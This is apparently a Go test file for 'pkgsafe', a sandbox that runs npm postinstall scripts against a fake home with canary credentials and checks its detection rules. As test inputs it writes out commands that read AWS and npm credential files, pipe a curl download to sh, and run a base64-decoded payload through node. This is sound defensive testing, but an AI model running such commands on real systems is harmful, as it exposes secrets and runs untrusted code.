package sandbox

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/niyam-ai/pkgsafe/internal/policy"
)

func TestFakeHomeAndCanaries(t *testing.T) {
	tmp, err := os.MkdirTemp("", "pkgsafe-test-*")
	if err != nil {
		t.Fatal(err)
	}
	defer os.RemoveAll(tmp)

	err = CreateFakeHome(tmp)
	if err != nil {
		t.Fatal(err)
	}

	dirs := []string{
		"home",
		"home/.aws",
		"home/.ssh",
		"home/.config/gcloud",
		"home/.azure",
		"home/.kube",
		"home/.docker",
		"workspace",
		"tmp",
	}
	for _, d := range dirs {
		path := filepath.Join(tmp, d)
		fi, err := os.Stat(path)
		if err != nil {
			t.Errorf("expected directory %s to exist, err: %v", d, err)
		} else if !fi.IsDir() {
			t.Errorf("expected %s to be a directory", d)
		}
	}

	for relPath, _ := range Canaries {
		path := filepath.Join(tmp, relPath)
		data, err := os.ReadFile(path)
		if err != nil {
			t.Errorf("expected file %s to exist, err: %v", relPath, err)
		} else if !strings.Contains(string(data), "PKGSAFE_CANARY") && !strings.Contains(string(data), "pkgsafe_fake") {
			t.Errorf("expected file %s to contain PKGSAFE_CANARY, got: %s", relPath, string(data))
		}
	}
}

func TestCleanEnv(t *testing.T) {
	os.Setenv("AWS_ACCESS_KEY_ID", "REAL_AWS_KEY")
	os.Setenv("GITHUB_TOKEN", "REAL_GITHUB_TOKEN")
	os.Setenv("SOME_OTHER_VAR", "KEEP_THIS")
	defer os.Unsetenv("AWS_ACCESS_KEY_ID")
	defer os.Unsetenv("GITHUB_TOKEN")
	defer os.Unsetenv("SOME_OTHER_VAR")

	env := CleanEnv("/tmp/fake-root")

	hasAws := false
	hasGithub := false
	hasSomeOther := false
	hasFakeHome := false

	for _, e := range env {
		if strings.HasPrefix(e, "AWS_ACCESS_KEY_ID=") {
			hasAws = true
		}
		if strings.HasPrefix(e, "GITHUB_TOKEN=") {
			hasGithub = true
		}
		if strings.HasPrefix(e, "SOME_OTHER_VAR=") {
			hasSomeOther = true
		}
		if strings.HasPrefix(e, "HOME=/tmp/fake-root/home") {
			hasFakeHome = true
		}
	}

	if hasAws {
		t.Error("expected AWS_ACCESS_KEY_ID to be removed")
	}
	if hasGithub {
		t.Error("expected GITHUB_TOKEN to be removed")
	}
	if !hasSomeOther {
		t.Error("expected SOME_OTHER_VAR to be kept")
	}
	if !hasFakeHome {
		t.Error("expected HOME to be updated to fake home path")
	}
}

func TestRunLifecycleScript(t *testing.T) {
	if !IsAvailable(context.Background()) {
		t.Skip("Sandbox not available on this platform")
	}

	runner := &ProcessRunner{}
	pol := policy.Default()

	t.Run("runs with fake HOME", func(t *testing.T) {
		req := SandboxRequest{
			Ecosystem:     "npm",
			PackageName:   "test-pkg",
			Version:       "1.0.0",
			ScriptName:    "postinstall",
			ScriptCommand: "echo $HOME",
			Timeout:       5 * time.Second,
			NetworkMode:   "disabled",
			Policy:        pol,
		}
		res, err := runner.RunLifecycleScript(context.Background(), req)
		if err != nil {
			t.Fatal(err)
		}
		if res.ExitCode != 0 {
			t.Errorf("expected exit code 0, got %d", res.ExitCode)
		}
	})

	t.Run("timeout enforcement", func(t *testing.T) {
		req := SandboxRequest{
			Ecosystem:     "npm",
			PackageName:   "test-pkg",
			Version:       "1.0.0",
			ScriptName:    "postinstall",
			ScriptCommand: "sleep 10",
			Timeout:       500 * time.Millisecond,
			NetworkMode:   "disabled",
			Policy:        pol,
		}
		res, err := runner.RunLifecycleScript(context.Background(), req)
		if err != nil {
			t.Fatal(err)
		}
		if !res.TimedOut {
			t.Error("expected script to time out")
		}
	})

	t.Run("reads fake npmrc", func(t *testing.T) {
		req := SandboxRequest{
			Ecosystem:     "npm",
			PackageName:   "test-pkg",
			Version:       "1.0.0",
			ScriptName:    "postinstall",
			ScriptCommand: "cat $HOME/.npmrc",
			Timeout:       5 * time.Second,
			NetworkMode:   "disabled",
			Policy:        pol,
		}
		res, err := runner.RunLifecycleScript(context.Background(), req)
		if err != nil {
			t.Fatal(err)
		}
		hasCanaryRead := false
		for _, f := range res.Findings {
			if f.RuleID == "credential_canary_read" {
				hasCanaryRead = true
			}
		}
		if !hasCanaryRead {
			t.Error("expected credential_canary_read finding")
		}
	})

	t.Run("reads fake aws credentials", func(t *testing.T) {
		req := SandboxRequest{
			Ecosystem:     "npm",
			PackageName:   "test-pkg",
			Version:       "1.0.0",
			ScriptName:    "postinstall",
			ScriptCommand: "cat $HOME/.aws/credentials",
			Timeout:       5 * time.Second,
			NetworkMode:   "disabled",
			Policy:        pol,
		}
		res, err := runner.RunLifecycleScript(context.Background(), req)
		if err != nil {
			t.Fatal(err)
		}
		hasCanaryRead := false
		for _, f := range res.Findings {
			if f.RuleID == "credential_canary_read" {
				hasCanaryRead = true
			}
		}
		if !hasCanaryRead {
			t.Error("expected credential_canary_read finding")
		}
	})

	t.Run("curl network command", func(t *testing.T) {
		req := SandboxRequest{
			Ecosystem:     "npm",
			PackageName:   "test-pkg",
			Version:       "1.0.0",
			ScriptName:    "postinstall",
			ScriptCommand: "curl -s http://example.com",
			Timeout:       5 * time.Second,
			NetworkMode:   "disabled",
			Policy:        pol,
		}
		res, err := runner.RunLifecycleScript(context.Background(), req)
		if err != nil {
			t.Fatal(err)
		}
		hasNetCall := false
		for _, f := range res.Findings {
			if f.RuleID == "network_call_from_lifecycle" {
				hasNetCall = true
			}
		}
		if !hasNetCall {
			t.Error("expected network_call_from_lifecycle finding")
		}
	})

	t.Run("curl shell download execute", func(t *testing.T) {
		req := SandboxRequest{
			Ecosystem:     "npm",
			PackageName:   "test-pkg",
			Version:       "1.0.0",
			ScriptName:    "postinstall",
			ScriptCommand: "curl -sL http://example.com | sh",
			Timeout:       5 * time.Second,
			NetworkMode:   "disabled",
			Policy:        pol,
		}
		res, err := runner.RunLifecycleScript(context.Background(), req)
		if err != nil {
			t.Fatal(err)
		}
		hasShellExec := false
		for _, f := range res.Findings {
			if f.RuleID == "shell_download_execute" {
				hasShellExec = true
			}
		}
		if !hasShellExec {
			t.Error("expected shell_download_execute finding")
		}
	})

	t.Run("base64 obfuscation", func(t *testing.T) {
		req := SandboxRequest{
			Ecosystem:     "npm",
			PackageName:   "test-pkg",
			Version:       "1.0.0",
			ScriptName:    "postinstall",
			ScriptCommand: "echo ZXhpdCAw | base64 --decode | node",
			Timeout:       5 * time.Second,
			NetworkMode:   "disabled",
			Policy:        pol,
		}
		res, err := runner.RunLifecycleScript(context.Background(), req)
		if err != nil {
			t.Fatal(err)
		}
		hasEncodedPayload := false
		for _, f := range res.Findings {
			if f.RuleID == "encoded_payload_execution" {
				hasEncodedPayload = true
			}
		}
		if !hasEncodedPayload {
			t.Error("expected encoded_payload_execution finding")
		}
	})
}
